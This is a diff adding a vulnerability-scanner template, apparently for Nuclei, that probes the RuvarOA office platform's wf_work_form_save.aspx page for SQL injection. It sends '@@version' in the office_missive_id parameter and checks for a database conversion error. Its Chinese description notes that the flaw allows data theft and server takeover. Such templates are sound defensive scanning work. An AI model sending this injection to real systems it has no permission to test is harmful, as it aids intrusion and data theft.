@@ -1,0 +1,21 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - 转换成数据类型 int 时失败
+        - status:
+            - 500
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /WorkFlow/wf_work_form_save.aspx?office_missive_id=@@version HTTP/1.1
+          Host: {{Hostname}}
+id: RuvarOA-sql
+info:
+    author: Superhero
+    description: RuvarOA协同办公平台 wf_work_form_save.aspx存在SQL注入漏洞，攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: RuvarOA协同办公平台 wf_work_form_save.aspx 存在SQL注入漏洞
+    severity: high
+    tags: []
